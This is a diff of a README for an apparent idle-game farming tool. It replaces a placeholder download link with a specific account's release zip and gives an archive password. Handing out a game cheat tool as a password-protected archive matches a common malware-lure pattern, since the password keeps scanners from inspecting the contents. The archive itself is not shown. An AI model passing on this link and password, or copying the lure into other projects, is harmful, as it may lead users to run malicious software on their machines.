@@ -6,7 +6,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/TapTapLoot-AFK-Farmer/releases/latest/download/TapTapLoot-Farmer.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/Hernolina/TapTapLoot-AFK-Farmer/releases/download/download/TapTapLoot_Farmer.zip)
 
 🔐 Archive password: `5868781`
 
